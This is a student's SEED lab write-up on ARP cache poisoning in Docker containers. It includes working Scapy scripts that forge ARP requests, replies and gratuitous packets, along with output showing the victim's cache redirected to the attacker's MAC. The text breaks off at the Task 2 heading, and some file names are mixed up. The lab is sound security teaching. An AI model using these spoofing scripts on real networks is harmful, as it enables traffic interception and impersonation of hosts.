Tyler Tran
May 5th, 2025
# SEED Lab: ARP Attack
## Starting Docker
#### Commands
```
seed@VM:~/Desktop$ cd Labsetup
seed@VM:~/.../Labsetup$ docker-compose build
seed@VM:~/.../Labsetup$ docker-compose up
```
#### Output
```
seed@VM> docker-compose build
	HostA uses an image, skipping
	HostB uses an image, skipping
	HostM uses an image, skipping
seed@VM> docker-compose up
	ARNING: Found orphan containers (seed-attacker, hostA-10.9.0.5, hostB-10.9.0.6) for this project. If you removed or renamed this service in your compose file, you can run this command with the --remove-orphans flag to clean it up.
	Creating A-10.9.0.5   ... done
	Creating B-10.9.0.6   ... done
	Creating M-10.9.0.105 ... done
	Attaching to M-10.9.0.105, B-10.9.0.6, A-10.9.0.5
	B-10.9.0.6 |  * Starting internet superserver inetd                      [ OK ] 
	A-10.9.0.5 |  * Starting internet superserver inetd                      [ OK ]
```

# Task 1: ARP Cache Poisoning
## Prereq
Getting the IP Address and Mac Address of each container:
- Attacker M Container
	- 10.9.0.105
	- 02:42:0a:09:00:69
- Victim A Container
	- 10.9.0.5
	- 02:42:0a:09:00:05
- Victim B Container
	- 10.9.0.6
	- 02:42:0a:09:00:06
```
// Attacker M Container
seed@VM> docksh M-10.9.0.105
root@M-10.9.0.105:/# arp -n
root@M-10.9.0.105:/# ifconfig
	eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
		inet 10.9.0.105  netmask 255.255.255.0  broadcast 10.9.0.255
		ether 02:42:0a:09:00:69  txqueuelen 0  (Ethernet)
		RX packets 70  bytes 10318 (10.3 KB)
		RX errors 0  dropped 0  overruns 0  frame 0
		TX packets 0  bytes 0 (0.0 B)
		TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

	lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
		inet 127.0.0.1  netmask 255.0.0.0
		loop  txqueuelen 1000  (Local Loopback)
		RX packets 0  bytes 0 (0.0 B)
		RX errors 0  dropped 0  overruns 0  frame 0
		TX packets 0  bytes 0 (0.0 B)
		TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

// Victim A Container
seed@VM> docksh A-10.9.0.5
root@A-10.9.0.5:/# arp -n
root@A-10.9.0.5:/# ifconfig
	eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
		inet 10.9.0.5  netmask 255.255.255.0  broadcast 10.9.0.255
		ether 02:42:0a:09:00:05  txqueuelen 0  (Ethernet)
		RX packets 71  bytes 10428 (10.4 KB)
		RX errors 0  dropped 0  overruns 0  frame 0
		TX packets 0  bytes 0 (0.0 B)
		TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

	lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
		inet 127.0.0.1  netmask 255.0.0.0
		loop  txqueuelen 1000  (Local Loopback)
		RX packets 0  bytes 0 (0.0 B)
		RX errors 0  dropped 0  overruns 0  frame 0
		TX packets 0  bytes 0 (0.0 B)
		TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

// Victim B Container
seed@VM> docksh A-10.9.0.6
root@A-10.9.0.6:/# arp -n
root@A-10.9.0.6:/# ifconfig
	eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
		inet 10.9.0.6  netmask 255.255.255.0  broadcast 10.9.0.255
		ether 02:42:0a:09:00:06  txqueuelen 0  (Ethernet)
		RX packets 70  bytes 10318 (10.3 KB)
		RX errors 0  dropped 0  overruns 0  frame 0
		TX packets 0  bytes 0 (0.0 B)
		TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

	lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
		inet 127.0.0.1  netmask 255.0.0.0
		loop  txqueuelen 1000  (Local Loopback)
		RX packets 0  bytes 0 (0.0 B)
		RX errors 0  dropped 0  overruns 0  frame 0
		TX packets 0  bytes 0 (0.0 B)
		TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

## Task 1.A (using ARP Request)
On host M, construct an ARP request packet to map B’s IP address
to M’s MAC address. Send the packet to A and check whether the attack is successful or not.

#### Python ARP-Request.py
```python
from scapy.all import *

# Victim A's values
a_mac   = "02:42:0a:09:00:05"   # MAC of A
a_ip    = "10.9.0.5"            # IP of A

# Victim B's values
b_mac   = "02:42:0a:09:00:06"   # MAC of B
b_ip    = "10.9.0.6"            # IP of B

# Attacker's values
m_mac   = "02:42:0a:09:00:69"   # MAC of M
m_ip    = "10.9.0.105"          # IP of M

# Forge an ARP request to A, asking "Who has B's IP?"
arp_req = ARP(
    op=1,               # ARP request
    psrc=b_ip,          # Claim to be B (pretending to be B IP Address)
    hwsrc=m_mac,        # Send M's MAC (attacker's MAC)
    pdst=b_ip,          # Asking "Who has B's IP?"
)

eth = Ether(dst=a_mac, src=m_mac)   # Send directly to A
pkt = eth / arp_req         # Combine Ethernet and ARP layers

sendp(pkt, iface="eth0")    # Send the packet on the specified interface
```

#### Output
```
// Attacker M Container
seed@VM> docker cp ARP-Request.py M-10.9.0.105:/tmp/
seed@VM> docksh M-10.9.0.105
root@M-10.9.0.105:/# python3 /tmp/ARP-Request.py
	.
	Sent 1 packets.

// Victim A Container
seed@VM> docksh A-10.9.0.5
root@A-10.9.0.5:/# ping 10.9.0.6
	PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.
	64 bytes from 10.9.0.6: icmp_seq=1 ttl=64 time=0.396 ms
	64 bytes from 10.9.0.6: icmp_seq=2 ttl=64 time=0.148 ms
	64 bytes from 10.9.0.6: icmp_seq=3 ttl=64 time=0.163 ms
	64 bytes from 10.9.0.6: icmp_seq=4 ttl=64 time=0.171 ms
	^C
	--- 10.9.0.6 ping statistics ---
	4 packets transmitted, 4 received, 0% packet loss, time 3078ms
	rtt min/avg/max/mdev = 0.148/0.219/0.396/0.102 ms
// Before Attack
root@A-10.9.0.5:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.6                 ether   02:42:0a:09:00:06   C                     eth0
// After Attack
root@A-10.9.0.5:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.6                 ether   02:42:0a:09:00:69   C                     eth0
```

#### Results
> - The attack is successful.
> - After executing the attack, Victim A changed IP address of Victim B (10.9.0.6) to point towards the mac address of Attacker M (02:42:0a:09:00:69).

## Task 1.B (using ARP reply)
On host M, construct an ARP reply packet to map B’s IP address to M’s MAC address. Send the packet to A and check whether the attack is successful or not. Try the attack under the following two scenarios, and report the results of your attack:
- **Scenario 1:** B’s IP is already in A’s cache.
- **Scenario 2:** B’s IP is not in A’s cache. You can use the command "arp -d a.b.c.d" to
remove the ARP cache entry for the IP address a.b.c.d.

#### Python ARP-Reply.py
```python
from scapy.all import *

# Victim A's values
a_mac   = "02:42:0a:09:00:05"   # MAC of A
a_ip    = "10.9.0.5"            # IP of A

# Victim B's IP (we're spoofing this)
b_mac   = "02:42:0a:09:00:06"   # MAC of B
b_ip    = "10.9.0.6"            # IP of B

# Attacker's values
m_mac   = "02:42:0a:09:00:69"   # MAC of M (attacker)
m_ip    = "10.9.0.105"          # IP of M

# Forge an ARP reply to A, saying "B's IP is at M's MAC"
arp_reply = ARP(
    op=2,               # ARP reply
    psrc=b_ip,          # Claim to be B (pretending to be B IP Address)
    hwsrc=m_mac,        # Send M's MAC (attacker's MAC)
    pdst=a_ip,          # Target is A
    hwdst=a_mac         # Send directly to A's MAC 
)

eth = Ether(dst=a_mac, src=m_mac) # Send directly to A
pkt = eth / arp_reply       # Combine Ethernet and ARP layers

sendp(pkt, iface="eth0")    # Send the packet on the specified interface

```

#### Output
```
// Attacker M Container
seed@VM> docker cp ARP-Request.py M-10.9.0.105:/tmp/
seed@VM> docksh M-10.9.0.105
root@M-10.9.0.105:/# python3 /tmp/ARP-Reply.py
	.
	Sent 1 packets.

// Victim A Container
seed@VM> docksh A-10.9.0.5
root@A-10.9.0.5:/# ping 10.9.0.6
	PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.
	64 bytes from 10.9.0.6: icmp_seq=1 ttl=64 time=0.396 ms
	64 bytes from 10.9.0.6: icmp_seq=2 ttl=64 time=0.148 ms
	64 bytes from 10.9.0.6: icmp_seq=3 ttl=64 time=0.163 ms
	64 bytes from 10.9.0.6: icmp_seq=4 ttl=64 time=0.171 ms
	^C
	--- 10.9.0.6 ping statistics ---
	4 packets transmitted, 4 received, 0% packet loss, time 3078ms
	rtt min/avg/max/mdev = 0.148/0.219/0.396/0.102 ms
// Scenario 1: B’s IP is already in A’s cache
// Before Attack
root@A-10.9.0.5:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.6                 ether   02:42:0a:09:00:06   C                     eth0
// After Attack
root@A-10.9.0.5:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.6                 ether   02:42:0a:09:00:69   C                     eth0
// Scenario 2: B’s IP is not in A’s cache
// Before Attack
root@A-10.9.0.5:/# arp -d 10.9.0.6
root@A-10.9.0.5:/# arp -n
// After Attack
root@A-10.9.0.5:/# arp -n
```

#### Results
> - Scenario 1:
> 	 - The attack is successful.
> 	 - After executing the attack, Victim A changed IP address of Victim B (10.9.0.6) to point towards the mac address of Attacker M (02:42:0a:09:00:69).
>  - Scenario 2:
> 	  - The attack is unsuccessful.
>    - After executing the attack, nothing changed in Victim A.

## Task 1.C (using ARP gratuitous message)
On host M, construct an ARP gratuitous packet, and use it to map B’s IP address to M’s MAC address. Please launch the attack under the same two scenarios as those described in Task 1.B.

ARP gratuitous packet is a special ARP request packet. It is used when a host machine needs to
update outdated information on all the other machine’s ARP cache. The gratuitous ARP packet has
the following characteristics:
- The source and destination IP addresses are the same, and they are the IP address of the host issuing the gratuitous ARP.
- The destination MAC addresses in both ARP header and Ethernet header are the broadcast MAC
address (ff:ff:ff:ff:ff:ff).
- No reply is expected.

#### Python ARP-Reply.py
```python
from scapy.all import *

# Victim A's values
a_mac   = "02:42:0a:09:00:05"   # MAC of A
a_ip    = "10.9.0.5"            # IP of A

# Victim B's values
b_mac   = "02:42:0a:09:00:06"   # MAC of B
b_ip    = "10.9.0.6"            # IP of B

# Attacker's values
m_mac   = "02:42:0a:09:00:69"   # MAC of M
m_ip    = "10.9.0.105"          # IP of M

# Build gratuitous ARP
arp_grat = ARP(
    op=1,                       # ARP request
    psrc=b_ip,                  # Claim to be B (pretending to be B IP Address)
    hwsrc=m_mac,                # Send M's MAC (attacker's MAC)
    pdst=b_ip,                  # Destination IP same as source (gratuitous)
    hwdst="00:00:00:00:00:00"   # Ignored in request, optional
)

eth = Ether(src=m_mac, dst="ff:ff:ff:ff:ff:ff") # Broadcast MAC address

pkt = eth / arp_grat        # Combine Ethernet and ARP layers
sendp(pkt, iface="eth0")    # Send the packet on the specified interface
```

#### Output
```
// Attacker M Container
seed@VM> docker cp ARP-Gratuitous.py M-10.9.0.105:/tmp/
seed@VM> docksh M-10.9.0.105
root@M-10.9.0.105:/# python3 /tmp/ARP-Gratuitous.py
	.
	Sent 1 packets.

// Victim A Container
seed@VM> docksh A-10.9.0.5
root@A-10.9.0.5:/# ping 10.9.0.6
	PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.
	64 bytes from 10.9.0.6: icmp_seq=1 ttl=64 time=0.396 ms
	64 bytes from 10.9.0.6: icmp_seq=2 ttl=64 time=0.148 ms
	64 bytes from 10.9.0.6: icmp_seq=3 ttl=64 time=0.163 ms
	64 bytes from 10.9.0.6: icmp_seq=4 ttl=64 time=0.171 ms
	^C
	--- 10.9.0.6 ping statistics ---
	4 packets transmitted, 4 received, 0% packet loss, time 3078ms
	rtt min/avg/max/mdev = 0.148/0.219/0.396/0.102 ms
// Scenario 1: B’s IP is already in A’s cache
// Before Attack
root@A-10.9.0.5:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.6                 ether   02:42:0a:09:00:06   C                     eth0
// After Attack
root@A-10.9.0.5:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.6                 ether   02:42:0a:09:00:69   C                     eth0
// Scenario 2: B’s IP is not in A’s cache
// Before Attack
root@A-10.9.0.5:/# arp -d 10.9.0.6
root@A-10.9.0.5:/# arp -n
// After Attack
root@A-10.9.0.5:/# arp -n
```

#### Results
> - Scenario 1:
> 	 - The attack is successful.
> 	 - After executing the attack, Victim A changed IP address of Victim B (10.9.0.6) to point towards the mac address of Attacker M (02:42:0a:09:00:69).
>  - Scenario 2:
> 	  - The attack is unsuccessful.
>    - After executing the attack, nothing changed in Victim A.

## Task 2: MITM Attack on Telnet using ARP Cache Poisoning
